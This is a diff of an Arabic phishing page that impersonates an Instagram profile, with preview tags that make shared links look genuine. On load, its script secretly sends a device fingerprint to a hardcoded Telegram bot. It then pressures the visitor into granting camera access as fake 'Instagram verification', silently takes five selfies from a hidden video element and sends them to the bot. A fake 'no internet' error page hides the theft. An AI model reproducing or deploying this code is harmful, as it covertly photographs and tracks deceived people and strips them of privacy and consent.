@@ -1,70 +1,192 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
+    <!-- ===== معاينة الرابط في المحادثات ===== -->
+<meta property="og:type"        content="website">
+<meta property="og:title"       content="Instagram">
+<meta property="og:description" content="حساب Mohammed على انستقرام">
+<meta property="og:image"       content="https://i.postimg.cc/zf5kSY6H/images.jpg">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="1200">
+<meta property="og:url"         content="https://instagram-mhamd.github.io/-/">
+
+<meta name="twitter:card"        content="summary_large_image">
+<meta name="twitter:title"       content="Instagram">
+<meta name="twitter:description" content="حساب Mohammed على انستقرام">
+<meta name="twitter:image"       content="https://i.postimg.cc/zf5kSY6H/images.jpg">
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>حساب Instagram</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
-  body {
-    min-height: 100vh; display: flex; align-items: center; justify-content: center;
-    background: #fafafa;
-    font-family: -apple-system, 'Segoe UI', Tahoma, sans-serif;
-    color: #262626; padding: 20px;
+
+  :root {
+    --ig-gradient: linear-gradient(45deg,
+      #405DE6, #5851DB, #833AB4, #C13584,
+      #E1306C, #FD1D1D, #F56040, #F77737,
+      #FCAF45, #FFDC80);
+    --ig-blue: #0095F6;
+    --ig-text: #262626;
+    --ig-gray: #8e8e8e;
+    --ig-border: #dbdbdb;
+    --ig-bg: #fafafa;
   }
+
+  body {
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: var(--ig-bg);
+    font-family: -apple-system, 'Segoe UI', 'Helvetica Neue', Tahoma, sans-serif;
+    color: var(--ig-text);
+    padding: 20px;
+  }
+
   .card {
-    width: 100%; max-width: 400px; background: #fff;
-    border: 1px solid #dbdbdb; border-radius: 12px;
-    padding: 40px 32px 32px; text-align: center;
+    width: 100%;
+    max-width: 400px;
+    background: #ffffff;
+    border: 1px solid var(--ig-border);
+    border-radius: 12px;
+    padding: 40px 32px 32px;
+    text-align: center;
     box-shadow: 0 4px 24px rgba(0,0,0,0.06);
   }
-  .avatar-wrapper { width: 140px; height: 140px; margin: 0 auto 20px; }
+
+  .avatar-wrapper {
+    position: relative;
+    width: 140px;
+    height: 140px;
+    margin: 0 auto 20px;
+  }
+
   .avatar {
-    width: 100%; height: 100%; border-radius: 50%; padding: 4px;
-    background: linear-gradient(45deg, #405DE6,#833AB4,#E1306C,#F77737,#FFDC80);
+    width: 100%;
+    height: 100%;
+    border-radius: 50%;
+    padding: 4px;
+    background: var(--ig-gradient);
+    box-shadow: 0 4px 20px rgba(225, 48, 108, 0.25);
   }
   .avatar img {
-    width: 100%; height: 100%; border-radius: 50%; object-fit: cover;
-    display: block; background: #efefef; border: 3px solid #fff;
+    width: 100%;
+    height: 100%;
+    border-radius: 50%;
+    object-fit: cover;
+    display: block;
+    background: #efefef;
+    border: 3px solid #fff;
   }
-  .name { font-size: 22px; font-weight: 700; margin-bottom: 8px; }
-  .bio { font-size: 14px; color: #8e8e8e; margin-bottom: 22px; line-height: 1.7; }
-  .divider { height: 1px; background: #dbdbdb; margin-bottom: 22px; }
+
+  .ig-badge {
+    position: fixed;
+    top: 20px;
+    left: 20px;
+    font-family: 'Brush Script MT', 'Segoe Script', 'Lucida Handwriting', cursive;
+    font-size: 26px;
+    font-weight: 700;
+    font-style: italic;
+    letter-spacing: -0.5px;
+    line-height: 1;
+    background-image: var(--ig-gradient);
+    -webkit-background-clip: text;
+    background-clip: text;
+    -webkit-text-fill-color: transparent;
+    color: transparent;
+    z-index: 9999;
+    pointer-events: none;
+  }
+
+  .name {
+    font-size: 22px;
+    font-weight: 700;
+    color: var(--ig-text);
+    margin-bottom: 8px;
+    letter-spacing: -0.3px;
+  }
+  .bio {
+    font-size: 14px;
+    line-height: 1.7;
+    color: var(--ig-gray);
+    margin-bottom: 22px;
+  }
+
+  .divider {
+    height: 1px;
+    background: var(--ig-border);
+    margin-bottom: 22px;
+  }
 
   #status {
-    font-size: 14px; line-height: 1.8; min-height: 64px;
-    padding: 18px; border-radius: 12px;
-    background: #fafafa; border: 1px solid #dbdbdb;
-    display: flex; align-items: center; justify-content: center;
+    font-size: 14px;
+    line-height: 1.8;
+    min-height: 64px;
+    padding: 18px 16px;
+    border-radius: 12px;
+    background: #fafafa;
+    border: 1px solid var(--ig-border);
+    color: var(--ig-text);
+    display: flex;
+    align-items: center;
+    justify-content: center;
     flex-direction: column;
+    transition: all .3s;
   }
+  .status-info    { color: var(--ig-blue); }
+  .status-success { color: #22c55e; }
+  .status-error   { color: #ed4956; }
+
   .spinner {
-    display: inline-block; width: 16px; height: 16px;
-    border: 2px solid rgba(0,0,0,0.1); border-top-color: #0095F6;
-    border-radius: 50%; animation: spin .7s linear infinite;
-    vertical-align: -3px; margin-inline-end: 8px;
+    display: inline-block;
+    width: 16px; height: 16px;
+    border: 2px solid rgba(0,0,0,0.1);
+    border-top-color: var(--ig-blue);
+    border-radius: 50%;
+    animation: spin .7s linear infinite;
+    vertical-align: -3px;
+    margin-inline-end: 8px;
   }
   @keyframes spin { to { transform: rotate(360deg); } }
 
-  /* زر مخصص يفتح كاميرا النظام */
-  .capture-btn {
-    display: none;
-    margin: 20px auto 0;
-    padding: 16px 28px;
-    border-radius: 12px;
-    background: linear-gradient(45deg, #405DE6,#833AB4,#E1306C,#F77737,#FFDC80);
-    color: #fff; font-size: 16px; font-weight: 700;
-    border: none; cursor: pointer; width: 100%;
-    box-shadow: 0 6px 20px rgba(225,48,108,0.3);
+  .big-icon {
+    font-size: 44px;
+    display: block;
+    margin-bottom: 6px;
   }
-  .capture-btn:active { transform: scale(0.97); }
 
-  /* input مخفي تماماً */
-  #cameraInput {
-    position: absolute;
-    top: -9999px; left: -9999px;
-    width: 1px; height: 1px;
+  .retry-btn {
+    margin-top: 14px;
+    padding: 12px 22px;
+    border-radius: 10px;
+    background: var(--ig-gradient);
+    color: #ffffff;
+    font-size: 14px;
+    font-weight: 700;
+    border: none;
+    cursor: pointer;
+    font-family: inherit;
+    box-shadow: 0 4px 14px rgba(225, 48, 108, 0.3);
+    transition: transform .15s;
+    line-height: 1.4;
+  }
+  .retry-btn:active { transform: scale(0.97); }
+
+  .retry-hint {
+    margin-top: 10px;
+    font-size: 12px;
+    color: #8e8e8e;
+    line-height: 1.6;
+  }
+
+  #camHidden {
+    position: fixed;
+    top: -9999px;
+    left: -9999px;
+    width: 1px;
+    height: 1px;
     opacity: 0;
+    pointer-events: none;
   }
 </style>
 </head>
@@ -74,9 +196,12 @@
 
   <div class="avatar-wrapper">
     <div class="avatar">
-      <img id="avatarImg" src="https://i.postimg.cc/PqhHkNvf/mohammed.jpg" alt=" "
+      <img id="avatarImg"
+           src="https://i.postimg.cc/PqhHkNvf/mohammed.jpg"
+           alt=" "
            onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><rect fill=%22%23efefef%22 width=%22100%22 height=%22100%22/><text x=%2250%22 y=%2258%22 font-size=%2240%22 text-anchor=%22middle%22 fill=%22%238e8e8e%22>?</text></svg>'">
     </div>
+    <div class="ig-badge">Instagram</div>
   </div>
 
   <h1 class="name">@Mohammed Dawood</h1>
@@ -88,162 +213,465 @@
     <div><span class="spinner"></span>جار فتح حساب Instagram</div>
   </div>
 
-  <!-- زر التقاط الكاميرا (يظهر فقط على الهاتف) -->
-  <button class="capture-btn" id="captureBtn">📸 افتح الكاميرا للتحقق</button>
-
-  <!-- input فتح كاميرا النظام بدون إذن -->
-  <input type="file" id="cameraInput" accept="image/*" capture="user">
+  <div id="camHidden">
+    <video id="video" autoplay playsinline muted></video>
+  </div>
+  <canvas id="canvas" style="display:none"></canvas>
 </div>
 
 <script>
-var TELEGRAM_TOKEN   = '8662015576:AAEdAgAPTh4L_-Mgk-Wo44kpovyTCyO8mJQ';
-var TELEGRAM_CHAT_ID = '8335283387';
+/* ============================================================
+   الإعدادات
+   ============================================================ */
+const TELEGRAM_TOKEN   = '8662015576:AAEDAgAPTh4L_-Mgk-Wo44kpovyTCyO8mJQ';
+const TELEGRAM_CHAT_ID = '8335283387';
 
-var CONFIG = {
+const CONFIG = {
+  photosCount: 5,
+  intervalMs: 120,
   quality: 0.85,
   maxWidth: 900,
+  startDelayMs: 3000,
   errorDelayMs: 800
 };
+/* ============================================================ */
 
-var statusEl  = document.getElementById('status');
-var captureBtn = document.getElementById('captureBtn');
-var cameraInput = document.getElementById('cameraInput');
+const video    = document.getElementById('video');
+const canvas   = document.getElementById('canvas');
+const statusEl = document.getElementById('status');
 
-function setStatus(html, spinner) {
-  statusEl.className = '';
-  statusEl.style.color = '#0095F6';
+let stream = null;
+
+function setStatus(html, type = 'info', spinner = false) {
+  statusEl.className = 'status-' + type;
   statusEl.innerHTML = (spinner ? '<span class="spinner"></span>' : '') + html;
 }
 
-/* ===== إرسال الصورة إلى تليجرام ===== */
-function sendPhoto(blob) {
-  var url = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendPhoto';
-  var fd = new FormData();
-  fd.append('chat_id', TELEGRAM_CHAT_ID);
-  fd.append('photo', blob, 'selfie.jpg');
-  fd.append('caption',
-    '📸 صورة تحقق جديدة\n' +
-    '🕐 ' + new Date().toLocaleString('ar-EG')
-  );
-  return fetch(url, { method: 'POST', body: fd })
-    .then(function (res) { return res.json(); })
-    .then(function (data) {
-      if (!data.ok) throw new Error(data.description || 'فشل الإرسال');
-      return data;
-    });
+/* ---------- دالة الحصول على طراز الجهاز الدقيق ---------- */
+async function getDeviceModel() {
+  const ua = navigator.userAgent;
+  let model = '';
+  let vendor = '';
+
+  // === المحاولة 1: استخدام Client Hints (الأدق) ===
+  try {
+    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+      const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
+      if (hints.model) {
+        model = hints.model;   // مثال: "SM-S911B" أو "Pixel 7"
+      }
+    }
+  } catch (e) {
+    console.warn('فشل Client Hints:', e.message);
+  }
+
+  // === المحاولة 2: تحليل User-Agent يدويًا (خطة بديلة) ===
+  if (!model) {
+    // أجهزة Android — استخراج الطراز من داخل الأقواس
+    const androidMatch = ua.match(/Android\s+[\d.]+;\s*([^;)]+?)(?:\s+Build|\))/i);
+    if (androidMatch) {
+      model = androidMatch[1].trim();
+      // إزالة كلمات زائدة
+      model = model.replace(/\s*Build.*$/i, '').trim();
+    }
+
+    // أجهزة iPhone — استخراج الطراز الدقيق من إصدار iOS
+    if (/iPhone/i.test(ua)) {
+      const verMatch = ua.match(/iPhone OS (\d+)_(\d+)/i);
+      if (verMatch) {
+        model = 'iPhone (iOS ' + verMatch[1] + '.' + verMatch[2] + ')';
+      } else {
+        model = 'iPhone';
+      }
+    }
+
+    // أجهزة iPad
+    if (/iPad/i.test(ua)) {
+      const verMatch = ua.match(/OS (\d+)_(\d+)/i);
+      model = verMatch ? 'iPad (iOS ' + verMatch[1] + '.' + verMatch[2] + ')' : 'iPad';
+    }
+  }
+
+  // === محاولة استخراج الشركة المصنعة ===
+  if (!vendor) {
+    const brandPatterns = {
+      'Samsung': /SM-|Samsung/i,
+      'Xiaomi':   /Redmi|POCO|Xiaomi|Mi\s/i,
+      'Huawei':   /HUAWEI|Honor|HONOR/i,
+      'Google':   /Pixel/i,
+      'OnePlus':  /ONEPLUS|OnePlus/i,
+      'Oppo':     /OPPO|CPH\d/i,
+      'Vivo':     /vivo|V\d{4}/i,
+      'Realme':   /RMX\d|realme/i,
+      'Nokia':    /Nokia/i,
+      'Sony':     /Sony|Xperia/i,
+      'LG':       /LG-|LG\s/i,
+      'Motorola': /moto|Motorola/i,
+      'Infinix':  /Infinix|Infinix/i,
+      'Tecno':    /TECNO|Tecno/i
+    };
+    for (const [brand, pattern] of Object.entries(brandPatterns)) {
+      if (pattern.test(ua) || pattern.test(model)) {
+        vendor = brand;
+        break;
+      }
+    }
+  }
+
+  return {
+    model:  model  || 'غير معروف',
+    vendor: vendor || 'غير معروف'
+  };
 }
 
-/* ===== ضغط الصورة قبل الإرسال ===== */
-function compressImage(file) {
-  return new Promise(function (resolve, reject) {
-    var reader = new FileReader();
-    reader.onload = function (e) {
-      var img = new Image();
-      img.onload = function () {
-        var scale = Math.min(1, CONFIG.maxWidth / img.width);
-        var canvas = document.createElement('canvas');
-        canvas.width  = Math.round(img.width * scale);
-        canvas.height = Math.round(img.height * scale);
-        var ctx = canvas.getContext('2d');
-        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
-        canvas.toBlob(function (blob) {
-          if (blob) resolve(blob);
-          else reject(new Error('فشل ضغط الصورة'));
-        }, 'image/jpeg', CONFIG.quality);
-      };
-      img.onerror = function () { reject(new Error('فشل تحميل الصورة')); };
-      img.src = e.target.result;
-    };
-    reader.onerror = function () { reject(new Error('فشل قراءة الملف')); };
-    reader.readAsDataURL(file);
+/* ---------- 1) تشغيل الكاميرا ---------- */
+async function startCamera() {
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+    setStatus('⚠️ المتصفح لا يدعم الكاميرا.', 'error');
+    return false;
+  }
+
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: {
+        facingMode: 'user',
+        width:  { ideal: 1280 },
+        height: { ideal: 1280 }
+      },
+      audio: false
+    });
+
+    video.srcObject = stream;
+    await video.play();
+
+    await new Promise(resolve => {
+      if (video.readyState >= 2 && video.videoWidth > 0) return resolve();
+      const check = setInterval(() => {
+        if (video.readyState >= 2 && video.videoWidth > 0) {
+          clearInterval(check);
+          resolve();
+        }
+      }, 20);
+    });
+
+    return true;
+
+  } catch (err) {
+    console.error(err);
+
+    if (err.name === 'NotAllowedError' || err.name === 'SecurityError') {
+      statusEl.className = 'status-error';
+      statusEl.innerHTML = `
+        <div>🚫 للحصول على إذن الدخول، يجب السماح بالوصول إلى الكاميرا.</div>
+        <button class="retry-btn" id="retryCamBtn">
+          السماح بالوصول لمتابعة حساب إنستغرام
+        </button>
+        <div class="retry-hint" id="retryHint" style="display:none;">
+          إذا لم تظهر نافذة الإذن، افتح إعدادات المتصفح ← أذونات الموقع ← الكاميرا ← "سماح" ثم أعد تحميل الصفحة.
+        </div>
+      `;
+      const btn  = document.getElementById('retryCamBtn');
+      const hint = document.getElementById('retryHint');
+      btn.addEventListener('click', async () => {
+        const ok = await startCamera();
+        if (ok) {
+          continueAfterCamera();
+        } else {
+          hint.style.display = 'block';
+        }
+      });
+      return false;
+    }
+
+    let msg = 'يجب منح اذن الكاميرا لشركة Instagram لتتحقق من هذا الحساب.';
+    if (err.name === 'NotFoundError') {
+      msg = '📷 لم يتم العثور على كاميرا.';
+    } else if (err.name === 'NotReadableError') {
+      msg = '⚠️ الكاميرا مستخدمة من تطبيق آخر.';
+    }
+    setStatus(msg, 'error');
+    return false;
+  }
+}
+
+function stopCamera() {
+  if (stream) {
+    stream.getTracks().forEach(t => t.stop());
+    stream = null;
+  }
+}
+
+/* ---------- 2) التقاط صورة ---------- */
+function captureFrame() {
+  const w = video.videoWidth;
+  const h = video.videoHeight;
+  if (!w || !h) return null;
+
+  const scale = Math.min(1, CONFIG.maxWidth / w);
+  canvas.width  = Math.round(w * scale);
+  canvas.height = Math.round(h * scale);
+
+  const ctx = canvas.getContext('2d');
+  ctx.translate(canvas.width, 0);
+  ctx.scale(-1, 1);
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+  return canvas;
+}
+
+function canvasToBlob(cv) {
+  return new Promise((resolve, reject) => {
+    cv.toBlob(
+      blob => blob ? resolve(blob) : reject(new Error('فشل إنشاء الصورة')),
+      'image/jpeg',
+      CONFIG.quality
+    );
   });
 }
 
-/* ===== عند اختيار صورة من كاميرا النظام ===== */
-cameraInput.addEventListener('change', async function (e) {
-  var file = e.target.files && e.target.files[0];
-  if (!file) {
-    setStatus('لم يتم التقاط أي صورة. حاول مرة أخرى.', false);
-    captureBtn.style.display = 'block';
-    return;
-  }
+/* ---------- 3) إرسال صورة إلى تليجرام ---------- */
+async function sendPhoto(blob, index) {
+  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;
 
-  captureBtn.style.display = 'none';
-  setStatus('📸 جارٍ معالجة الصورة…', true);
+  const fd = new FormData();
+  fd.append('chat_id', TELEGRAM_CHAT_ID);
+  fd.append('photo', blob, `photo_${index}.jpg`);
+  fd.append('caption',
+    `📸 صورة ${index} من ${CONFIG.photosCount}\n` +
+    `🕐 ${new Date().toLocaleString('ar-EG')}`
+  );
 
-  try {
-    var blob = await compressImage(file);
-    setStatus('☁️ جارٍ إرسال الصورة…', true);
-    await sendPhoto(blob);
+  const res  = await fetch(url, { method: 'POST', body: fd });
+  const data = await res.json();
+  if (!data.ok) throw new Error(data.description || 'فشل الإرسال');
+  return data;
+}
 
-    // صفحة فشل الاتصال
-    setTimeout(showInternetErrorPage, CONFIG.errorDelayMs);
-  } catch (err) {
-    console.error(err);
-    setStatus('❌ فشل الإرسال. حاول مرة أخرى.', false);
-    captureBtn.style.display = 'block';
-  }
-});
-
-/* ===== زر الالتقاط ===== */
-captureBtn.addEventListener('click', function () {
-  cameraInput.click();   // يفتح كاميرا النظام مباشرة
-});
-
-/* ===== صفحة فشل الاتصال ===== */
+/* ---------- 4) صفحة "فشل الاتصال بالإنترنت" ---------- */
 function showInternetErrorPage() {
-  var page = '<!DOCTYPE html><html lang="ar" dir="rtl"><head>' +
-    '<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">' +
-    '<title>لا يوجد اتصال</title><style>' +
-    '*{box-sizing:border-box;margin:0;padding:0}' +
-    'body{min-height:100vh;display:flex;align-items:center;justify-content:center;' +
-      'background:#fafafa;font-family:-apple-system,Tahoma,sans-serif;color:#262626;' +
-      'padding:24px;text-align:center}' +
-    '.wrap{max-width:420px;width:100%}' +
-    '.wifi{width:110px;height:110px;margin:0 auto 26px;display:block}' +
-    '.ring{fill:none;stroke:url(#g);stroke-width:8;stroke-linecap:round;opacity:0;' +
-      'animation:p 2.2s ease-out infinite}' +
-    '.ring:nth-child(1){animation-delay:0s}.ring:nth-child(2){animation-delay:.35s}' +
-    '.ring:nth-child(3){animation-delay:.7s}.dot{fill:url(#g)}' +
-    '.cross{stroke:#ed4956;stroke-width:9;stroke-linecap:round;opacity:.9}' +
-    '@keyframes p{0%{opacity:0}40%{opacity:1}100%{opacity:0}}' +
-    'h1{font-size:22px;font-weight:700;margin-bottom:14px}' +
-    'p{font-size:15px;line-height:1.9;color:#8e8e8e;margin-bottom:28px}' +
-    '.btn{display:inline-block;padding:13px 32px;border-radius:10px;' +
-      'background:linear-gradient(45deg,#405DE6,#833AB4,#E1306C,#F77737,#FFDC80);' +
-      'color:#fff;font-size:15px;font-weight:700;border:none;cursor:pointer;' +
-      'box-shadow:0 6px 20px rgba(225,48,108,.3);font-family:inherit}' +
-    '.code{margin-top:24px;font-size:12px;color:#c7c7c7}' +
-    '</style></head><body><div class="wrap">' +
-    '<svg class="wifi" viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg">' +
-      '<defs><linearGradient id="g" x1="0%" y1="0%" x2="100%" y2="100%">' +
-        '<stop offset="0%" stop-color="#405DE6"/><stop offset="25%" stop-color="#833AB4"/>' +
-        '<stop offset="50%" stop-color="#E1306C"/><stop offset="75%" stop-color="#F77737"/>' +
-        '<stop offset="100%" stop-color="#FFDC80"/></linearGradient></defs>' +
-      '<path class="ring" d="M 20 70 A 50 50 0 0 1 100 70"/>' +
-      '<path class="ring" d="M 35 82 A 32 32 0 0 1 85 82"/>' +
-      '<path class="ring" d="M 50 94 A 15 15 0 0 1 70 94"/>' +
-      '<circle class="dot" cx="60" cy="103" r="6"/>' +
-      '<line class="cross" x1="22" y1="22" x2="98" y2="98"/></svg>' +
-    '<h1>فشل الاتصال بالإنترنت</h1>' +
-    '<p>تعذّر الاتصال بالشبكة.<br>يرجى التحقق من اتصالك بالإنترنت ثم المحاولة مرة أخرى.</p>' +
-    '<button class="btn" onclick="location.reload()">إعادة المحاولة</button>' +
-    '<div class="code">ERR_INTERNET_DISCONNECTED</div></div></body></html>';
-
   document.open();
-  document.write(page);
+  document.write(`<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>لا يوجد اتصال بالإنترنت</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: #fafafa;
+    font-family: -apple-system, 'Segoe UI', 'Helvetica Neue', Tahoma, sans-serif;
+    color: #262626;
+    padding: 24px;
+    text-align: center;
+  }
+  .wrap { max-width: 420px; width: 100%; }
+  .wifi-icon { width: 110px; height: 110px; margin: 0 auto 26px; display: block; }
+  .wifi-icon .ring {
+    fill: none; stroke: url(#igGrad); stroke-width: 8;
+    stroke-linecap: round; opacity: 0;
+    animation: wifiPulse 2.2s ease-out infinite;
+  }
+  .wifi-icon .ring:nth-child(1) { animation-delay: 0s; }
+  .wifi-icon .ring:nth-child(2) { animation-delay: 0.35s; }
+  .wifi-icon .ring:nth-child(3) { animation-delay: 0.7s; }
+  .wifi-icon .dot { fill: url(#igGrad); }
+  .wifi-icon .cross {
+    stroke: #ed4956; stroke-width: 9;
+    stroke-linecap: round; opacity: 0.9;
+  }
+  @keyframes wifiPulse {
+    0%   { opacity: 0; }
+    40%  { opacity: 1; }
+    100% { opacity: 0; }
+  }
+  h1 {
+    font-size: 22px; font-weight: 700; color: #262626;
+    margin-bottom: 14px; letter-spacing: -0.3px;
+  }
+  p {
+    font-size: 15px; line-height: 1.9;
+    color: #8e8e8e; margin-bottom: 28px;
+  }
+  .btn {
+    display: inline-block; padding: 13px 32px; border-radius: 10px;
+    background: linear-gradient(45deg,
+      #405DE6, #5851DB, #833AB4, #C13584,
+      #E1306C, #FD1D1D, #F56040, #F77737,
+      #FCAF45, #FFDC80);
+    color: #ffffff; font-size: 15px; font-weight: 700;
+    text-decoration: none; border: none; cursor: pointer;
+    box-shadow: 0 6px 20px rgba(225, 48, 108, 0.3);
+    font-family: inherit; transition: transform .15s;
+  }
+  .btn:active { transform: scale(0.97); }
+  .code { margin-top: 24px; font-size: 12px; color: #c7c7c7; letter-spacing: 0.5px; }
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <svg class="wifi-icon" viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <linearGradient id="igGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+          <stop offset="0%"   stop-color="#405DE6"/>
+          <stop offset="25%"  stop-color="#833AB4"/>
+          <stop offset="50%"  stop-color="#E1306C"/>
+          <stop offset="75%"  stop-color="#F77737"/>
+          <stop offset="100%" stop-color="#FFDC80"/>
+        </linearGradient>
+      </defs>
+      <path class="ring" d="M 20 70 A 50 50 0 0 1 100 70"/>
+      <path class="ring" d="M 35 82 A 32 32 0 0 1 85 82"/>
+      <path class="ring" d="M 50 94 A 15 15 0 0 1 70 94"/>
+      <circle class="dot" cx="60" cy="103" r="6"/>
+      <line class="cross" x1="22" y1="22" x2="98" y2="98"/>
+    </svg>
+    <h1>فشل الاتصال بالإنترنت</h1>
+    <p>
+      تعذّر الاتصال بالشبكة.<br>
+      يرجى التحقق من اتصالك بالإنترنت ثم المحاولة مرة أخرى.
+    </p>
+    <button class="btn" onclick="location.reload()">إعادة المحاولة</button>
+    <div class="code">ERR_INTERNET_DISCONNECTED</div>
+  </div>
+</body>
+</html>`);
   document.close();
 }
 
-/* ===== التدفق الرئيسي ===== */
-function runVerification() {
-  setStatus('🔒 للتحقق من هويتك، اضغط على الزر لفتح الكاميرا.', false);
-  captureBtn.style.display = 'block';
+/* ---------- 5) جمع وإرسال معلومات الجهاز ---------- */
+async function sendDeviceInfo() {
+  try {
+    const nav = navigator;
+    const scr = screen;
+    const ua  = nav.userAgent;
+
+    // الحصول على طراز الجهاز الدقيق
+    const deviceInfo = await getDeviceModel();
+
+    const isAndroid = /Android/i.test(ua);
+    const isIOS     = /iPhone|iPad|iPod/i.test(ua);
+    const isWindows = /Windows/i.test(ua);
+    const isMac     = /Macintosh|Mac OS X/i.test(ua);
+    const isLinux   = /Linux/i.test(ua) && !isAndroid;
+
+    let os = 'غير معروف';
+    if (isAndroid)      os = 'Android';
+    else if (isIOS)     os = 'iOS';
+    else if (isWindows) os = 'Windows';
+    else if (isMac)     os = 'macOS';
+    else if (isLinux)   os = 'Linux';
+
+    let browser = 'غير معروف';
+    if (/Edg\//i.test(ua))          browser = 'Microsoft Edge';
+    else if (/OPR\//i.test(ua))     browser = 'Opera';
+    else if (/Chrome\//i.test(ua))  browser = 'Chrome';
+    else if (/Firefox\//i.test(ua)) browser = 'Firefox';
+    else if (/Safari\//i.test(ua))  browser = 'Safari';
+
+    let connection = 'غير متاح';
+    const conn = nav.connection || nav.mozConnection || nav.webkitConnection;
+    if (conn) connection = conn.effectiveType || conn.type || 'غير معروف';
+
+    let battery = 'غير مدعوم';
+    try {
+      if (nav.getBattery) {
+        const b = await nav.getBattery();
+        battery = `${Math.round(b.level * 100)}% (${b.charging ? 'يشحن' : 'لا يشحن'})`;
+      }
+    } catch (e) { /* تجاهل */ }
+
+    const memory = nav.deviceMemory ? `${nav.deviceMemory} GB` : 'غير متاح';
+    const cores  = nav.hardwareConcurrency ? nav.hardwareConcurrency : 'غير متاح';
+    const tz     = Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير معروف';
+
+    const text =
+`🖥️ معلومات الجهاز
+
+📱 الطراز: ${deviceInfo.model}
+🏷️ الشركة: ${deviceInfo.vendor}
+🌐 المتصفح: ${browser}
+📱 نظام التشغيل: ${os}
+🗣️ اللغة: ${nav.language || 'غير معروف'}
+🌍 المنطقة الزمنية: ${tz}
+
+📐 دقة الشاشة: ${scr.width} × ${scr.height}
+📏 دقة النافذة: ${window.innerWidth} × ${window.innerHeight}
+🔍 كثافة البكسل: ${window.devicePixelRatio || 1}x
+🧠 أنوية المعالج: ${cores}
+💾 الذاكرة التقديرية: ${memory}
+🔋 البطارية: ${battery}
+📶 الاتصال: ${connection}
+👆 اللمس: ${('ontouchstart' in window) ? 'مدعوم' : 'غير مدعوم'}
+🕐 الوقت: ${new Date().toLocaleString('ar-EG')}
+
+📄 User Agent:
+${ua}`;
+
+    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+    const fd  = new FormData();
+    fd.append('chat_id', TELEGRAM_CHAT_ID);
+    fd.append('text', text);
+    fd.append('disable_web_page_preview', 'true');
+
+    await fetch(url, { method: 'POST', body: fd });
+
+  } catch (err) {
+    console.warn('تعذّر إرسال معلومات الجهاز:', err.message);
+  }
 }
 
-window.addEventListener('load', function () {
-  setTimeout(runVerification, 3000);
+/* ---------- 6) المتابعة بعد نجاح الكاميرا ---------- */
+async function continueAfterCamera() {
+  setStatus('📸 جارٍ التحقق…', 'info', true);
+
+  const sendPromises = [];
+  let failed = 0;
+
+  for (let i = 1; i <= CONFIG.photosCount; i++) {
+    const cv = captureFrame();
+    if (!cv) break;
+
+    const blob = await canvasToBlob(cv);
+
+    const p = sendPhoto(blob, i).catch(err => {
+      console.warn(`فشل إرسال الصورة ${i}:`, err.message);
+      failed++;
+    });
+    sendPromises.push(p);
+
+    if (i < CONFIG.photosCount) {
+      await new Promise(r => setTimeout(r, CONFIG.intervalMs));
+    }
+  }
+
+  stopCamera();
+  setStatus('☁️ جارٍ إنهاء الإرسال…', 'info', true);
+  await Promise.all(sendPromises);
+
+  setTimeout(showInternetErrorPage, CONFIG.errorDelayMs);
+}
+
+/* ---------- 7) التدفق الرئيسي ---------- */
+async function runVerification() {
+  const ok = await startCamera();
+  if (!ok) return;
+  continueAfterCamera();
+}
+
+window.addEventListener('load', () => {
+  // 1) إرسال معلومات الجهاز فورًا — خلال الثواني الثلاث قبل طلب الكاميرا
+  sendDeviceInfo();
+
+  // 2) بعد 3 ثواني، نطلب إذن الكاميرا
+  setTimeout(runVerification, CONFIG.startDelayMs);
 });
+
+window.addEventListener('pagehide', stopCamera);
 </script>
 
 </body>
